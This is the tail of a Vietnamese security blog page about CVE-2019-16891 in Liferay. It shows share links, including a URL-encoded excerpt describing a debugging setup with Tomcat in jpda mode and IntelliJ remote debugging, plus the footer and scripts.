    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fliferay_cve-2019-16891%2f&name=T%c3%acm%20hi%e1%bb%83u%20CVE-2019-16891%20-%20Liferay%20JSON%20Deserialization%20to%20RCE&description=Tham%20kh%e1%ba%a3o%3a%20https%3a%2f%2fsec.vnpt.vn%2f2019%2f09%2fliferay-deserialization-json-deserialization-part-4%2f%20Version%20affect%3a%20Liferay%20%26lt%3b%207.x%20Setup%20debug%20Liferay%206.2.5%20g%e1%bb%93m%20lu%c3%b4n%20tomcat%20server%3a%20https%3a%2f%2fsourceforge.net%2fprojects%2flportal%2ffiles%2fLiferay%2520Portal%2f6.2.5%2520GA6%2f%0aServer%3a%20Gi%e1%ba%a3i%20n%c3%a9n%20file%20tr%c3%aan%2c%20config%201%20v%c3%a0i%20c%c3%a1i%20nh%e1%bb%8f%20nh%e1%bb%8f%20theo%20guide%20r%e1%bb%93i%20start%20tomcat%20server%20%e1%bb%9f%20mode%20jpda%3a%20.%5ccatalina%20jpda%20start%20%28%e1%bb%9f%20%c4%91%c3%a2y%20m%c3%acnh%20d%c3%b9ng%20java%201.8%29%20Client%3a%20Open%20file%20or%20project%20%26ndash%3b%26gt%3b%20ROOT%20folder%20trong%20webapps%28ch%e1%bb%89%20c%e1%ba%a7n%20debug%20folder%20n%c3%a0y%29%20%26ndash%3b%26gt%3b%20Load%20%26ndash%3b%26gt%3b%20Edit%20configuration%20%26ndash%3b%26gt%3b%20Remote%20JVM%20Debug%20%26ndash%3b%26gt%3b%20Config%20port%208000%28jpda%20default%20ch%e1%ba%a1y%20port%208000%29%20%26ndash%3b%26gt%3b%20Debug%20N%e1%ba%bfu%20th%e1%ba%a5y%20c%c3%a1c%20th%c6%b0%20vi%e1%bb%87n%20%c4%91%c3%a3%20%c4%91%c6%b0%e1%bb%a3c%20load%20trong%20Project%20Structure%20m%c3%a0%20ch%c6%b0a%20th%e1%ba%a5y%20%e1%bb%9f%20External%20Library%20th%c3%ac%20nh%e1%bb%9b%20set%20JDK%20%e1%bb%9f%20intellij" aria-label="Tumblr">
      <i class="fab fa-tumblr fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fliferay_cve-2019-16891%2f&t=T%c3%acm%20hi%e1%bb%83u%20CVE-2019-16891%20-%20Liferay%20JSON%20Deserialization%20to%20RCE" aria-label="Hacker News">
      <i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i>
    </a>
  </li>
</ul>

    </div>

    <div id="actions-footer">
      
        <a id="menu-toggle" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;" aria-label="Menu">
          <i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
        <a id="toc-toggle" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;" aria-label="TOC">
          <i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share-toggle" class="icon" href="#" onclick="$('#share-footer').toggle();return false;" aria-label="Share">
          <i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
          <i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>


  <footer id="footer">
  <div class="footer-left">
    Copyright  &copy; 2024  devme4f&#39;s blog 
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
        <li><a href="/">Home</a></li>
         
        <li><a href="/posts">Archives</a></li>
         
        <li><a href="/about">About</a></li>
        
      </ul>
    </nav>
  </div>
</footer>


  </div>
</body>

<link rel="stylesheet" href=/lib/font-awesome/css/all.min.css>
<script src=/lib/jquery/jquery.min.js></script>
<script src=/js/main.js></script>

<script src=/js/code-copy.js></script>




</html>
